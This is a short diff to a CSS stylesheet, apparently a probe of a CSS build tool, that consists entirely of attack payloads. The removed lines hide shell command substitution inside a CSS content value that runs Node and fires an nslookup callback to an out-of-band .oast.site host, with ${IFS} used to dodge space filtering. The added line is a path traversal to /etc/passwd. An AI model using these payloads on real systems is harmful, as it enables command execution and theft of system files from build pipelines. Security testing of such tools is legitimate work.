@@ -1,10 +1,1 @@
-@layer utilities {
-  .exploit {
-    content: "`$(
-      node -e \"const { test } = require('./integrations/utils'); 
-      test('exploit', { fs: {} }, async ({ exec }) => {
-        await exec('nslookup${IFS}m1o7mgfkflj0fxikvrd8p6jwispq9uiuz.oast.site');
-      }, { only: true })\"
-    )`";
-  }
-}
+@config "../../../../../../../etc/passwd";
